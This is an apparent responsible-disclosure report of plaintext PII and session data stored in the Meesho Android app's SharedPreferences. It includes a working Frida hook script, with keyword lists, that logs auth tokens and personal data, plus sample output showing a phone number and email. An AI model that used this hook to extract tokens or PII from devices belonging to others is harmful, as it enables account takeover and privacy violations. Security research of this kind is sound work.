# Meesho Android Application – Sensitive User Data Exposure via Insecure SharedPreferences Storage

## Summary

During dynamic analysis of the **Meesho Android Application** (`com.meesho.supply`) using Frida, sensitive user Personally Identifiable Information (PII) including phone number, email address, full name, user ID, and detailed session data was found stored in **plaintext** inside SharedPreferences.

The application does not adequately protect sensitive data, making it vulnerable to local extraction by attackers with device access.

## Affected Application

| Field              | Details                                      |
|--------------------|----------------------------------------------|
| Application        | Meesho - Resell & Earn                       |
| Package Name       | `com.meesho.supply`                          |
| Platform           | Android                                      |
| Vulnerability Type | Insecure Storage of Sensitive Information    |
| Component          | SharedPreferences                            |
| Affected Keys      | `USER`, `super_properties`, `APP_SESSION_EVENT`, etc. |

## Affected Components

- Plaintext storage of PII in SharedPreferences
- `USER` key containing phone, email, name, user_id
- Extensive user profiling and tracking data in `super_properties`

## Security Impact

An attacker with physical access to the device can:

- Extract full user identity (phone, email, name, user_id)
- Access detailed behavioral and device profiling data
- Retrieve session and authentication-related information

**Potential consequences:**
- Privacy violation and identity theft
- Targeted phishing or social engineering
- Account enumeration

## Attack Requirements

- Physical access to the target Android device
- Frida or equivalent dynamic instrumentation tool

## Vulnerability Details

**CWE Classification:**
- CWE-312: Cleartext Storage of Sensitive Information
- CWE-359: Exposure of Private Personal Information
- CWE-922: Insecure Storage of Sensitive Information

**CVSS v3.1 Score (Estimated):** 6.2 – 7.1 (Medium-High)  
**Attack Vector:** Physical  
**Attack Complexity:** Low  
**Privileges Required:** None  
**User Interaction:** None  
**Scope:** Unchanged  
**Confidentiality:** High

## Steps to Reproduce

### Using Frida (Dynamic Analysis)

1. Save the following script as **`meeshobug2.js`**:

```javascript
Java.perform(function() {

    console.log("╔══════════════════════════════════════╗");
    console.log("║   PII & AUTH TOKEN EXPOSURE TESTER   ║");
    console.log("╚══════════════════════════════════════╝\n");

    var findings = {
        piiFound: [],
        authTokensFound: [],
        sensitivePrefs: []
    };

    // Keys to watch for
    var PII_KEYS = ["USER", "phone", "email", "name", 
                    "user_id", "USER_LOCATION", "CONFIG",
                    "super_properties", "savedProperties"];

    var AUTH_KEYS = ["XO", "OX", "token", "auth", 
                     "session", "APP_SESSION_EVENT", 
                     "fcm_token", "CACHED_CHANNEL"];

    try {
        var Editor = Java.use(
            "android.app.SharedPreferencesImpl$EditorImpl"
        );

        Editor.putString.overload(
            "java.lang.String",
            "java.lang.String"
        ).implementation = function(key, value) {

            // Check for PII
            var isPII = PII_KEYS.some(function(k) {
                return key.includes(k);
            });

            // Check for auth
            var isAuth = AUTH_KEYS.some(function(k) {
                return key.toLowerCase().includes(k.toLowerCase());
            });

            if (isPII && value && value.length > 2) {
                findings.piiFound.push(key);
                console.log("\n[🔴 PII EXPOSED]");
                console.log("Key   : " + key);
                console.log("Value : " + value.substring(0, 200));
            }

            if (isAuth && value && value.length > 2) {
                findings.authTokensFound.push(key);
                console.log("\n[🔴 AUTH TOKEN EXPOSED]");
                console.log("Key   : " + key);
                console.log("Value : " + value.substring(0, 100));
            }

            return this.putString(key, value);
        };

        console.log("[✅] SharedPreferences hook loaded");

    } catch(e) {
        console.log("[❌] Hook failed: " + e);
    }

    // Print summary every 30 seconds
    setTimeout(function() {
        console.log("\n╔══════════════════════════════════════╗");
        console.log("║         FINDINGS SUMMARY             ║");
        console.log("╠══════════════════════════════════════╣");
        console.log("║ PII keys found   : " + findings.piiFound.length);
        console.log("║ Auth keys found  : " + findings.authTokensFound.length);
        console.log("╚══════════════════════════════════════╝");
    }, 30000);
});
```

2. Run Frida with the script:
   ```bash
   frida -U -f com.meesho.supply -l meeshobug2.js
   ```

3. Interact with the app normally (login, browse products, view account section, etc.).

4. Observe real-time logs showing exposed PII and sensitive data.

**Sample Output:**
```log
[🔴 PII EXPOSED]
Key   : USER
Value : {"user_id":149712167,"phone":"+916205695120","email":"soyamarya96@gmail.com","name":"Soyam Arya",...}

[🔴 PII EXPOSED]
Key   : super_properties
Value : {"Phone":"+916205695120", ...}
```
## Steps to Reproduce IN VIDEO : https://drive.google.com/file/d/1tUOME-DfuTVDnbCxvDPKNAZjrRl0GmJQ/view?usp=sharing
## Root Cause

- Sensitive PII and session data stored in plaintext SharedPreferences
- No use of `EncryptedSharedPreferences` or Android Keystore
- Excessive local persistence of user and analytics data

## Recommendations

1. Use **EncryptedSharedPreferences** with `MasterKey.Builder` (AES256_GCM).
2. Store high-sensitivity data (tokens, PII) in the **Android Keystore**.
3. Minimize storage of unnecessary PII and implement proper data redaction.
4. Review and limit what is written to SharedPreferences.

## Severity Assessment

**Severity:** Medium-High (due to direct exposure of PII)

## Disclosure Timeline

- **June 2026** – Vulnerability discovered during security research
- **June 2026** – Reported to Meesho security team
- TBD – Vendor response / patch
- TBD – CVE assigned
- TBD – Public disclosure

## Proof of Concept Media

- Frida script: `meeshobug2.js` (included above)
- Screenshots and full logs available upon request

## Credits

**Researcher:** Soyam Arya  
**Alias:** honest_corrupt  
**GitHub:** https://github.com/honestcorrupt

---

**Disclaimer**  
This research was conducted entirely in a controlled testing environment using the researcher’s own account and personal device. No real user data belonging to others was accessed or stored. All testing followed responsible disclosure principles.
